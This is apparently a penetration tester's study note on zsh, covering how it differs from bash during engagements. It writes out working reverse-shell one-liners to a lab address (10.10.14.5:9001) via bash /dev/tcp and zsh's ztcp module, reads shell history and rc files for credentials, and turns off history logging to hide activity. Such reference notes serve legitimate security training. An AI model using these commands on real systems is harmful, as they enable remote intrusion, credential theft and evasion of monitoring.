# zsh

**Tags:** `#zsh` `#shell` `#macos` `#linux` `#reverseshell` `#loot`

The Z shell — default interactive shell on **macOS** and increasingly on Linux. It's a
superset of [[Tools/Command Shell/Bash|Bash]] for interactive use but **not** 100%
script-compatible, and a couple of the differences bite on an engagement (most importantly:
the classic `/dev/tcp` reverse shell is a *bash* feature that zsh lacks). This note is just
the deltas — everything in the Bash note applies unless noted.

**Docs:** https://www.zsh.org · **Install:** `apt install zsh` (default shell on macOS since Catalina).

---

## Differences That Bite

| Behaviour | bash | zsh |
|---|---|---|
| Array indexing | 0-based | **1-based** (`${a[1]}` is the first element) |
| Unquoted `$var` word-splitting | splits on `$IFS` | **no** splitting by default — bash scripts that rely on it break |
| Globbing | basic (needs `shopt`) | extended by default (`**` recursive, `*(.)` qualifiers) |
| `/dev/tcp/host/port` | **built-in** | **absent** — see reverse shell below |
| History file | `~/.bash_history` | `~/.zsh_history` |
| RC file | `~/.bashrc` | `~/.zshrc` (+ oh-my-zsh in `~/.oh-my-zsh`) |

> [!tip] On macOS or a zsh box, run `bash` first if you want bash behaviour — bash is almost
> always still installed even when zsh is the login shell.

---

## Reverse Shell (no `/dev/tcp`)

The bash one-liner **won't** work in a pure zsh context. Two options:

```bash
# Easiest: just invoke bash for the payload
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'

# Native zsh, using its TCP module (when only zsh is available)
zmodload zsh/net/tcp
ztcp 10.10.14.5 9001            # connects; the socket fd lands in $REPLY
zsh >&$REPLY 2>&$REPLY 0>&$REPLY
```

---

## Loot & OPSEC

```bash
cat ~/.zsh_history                 # loot: cleartext command history (creds/hosts) — like .bash_history
cat ~/.zshrc ~/.oh-my-zsh/custom/*.zsh   # aliases/env that may hold secrets or paths

# Don't log your own session (leading-space trick needs setopt HIST_IGNORE_SPACE)
unset HISTFILE
setopt HIST_IGNORE_SPACE           # a leading space then keeps a command out of history
```

Restricted zsh exists too (`zsh -r` / `rzsh`) — escape it the same way as any restricted shell
(interpreters, editors, pagers) — see [[Class notes/HTB Academy/CPTS v2 (claude)/Linux Priv Esc|Linux Priv Esc]].

---

## Quick Reference

| Goal | Command |
|---|---|
| Get bash behaviour | `bash` |
| Reverse shell (via bash) | `bash -c 'bash -i >& /dev/tcp/IP/9001 0>&1'` |
| Native zsh reverse shell | `zmodload zsh/net/tcp; ztcp IP 9001; zsh >&$REPLY 2>&$REPLY 0>&$REPLY` |
| History loot | `cat ~/.zsh_history` |
| Don't log session | `unset HISTFILE` |

---

> [!note] **See also** — everything else is in [[Tools/Command Shell/Bash|Bash]] (`/dev/tcp` shells, rbash escape, injection obfuscation, PTY upgrade); the macOS terminal you'll run it in: [[Tools/Command Shell/iTerm2|iTerm2]]; [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
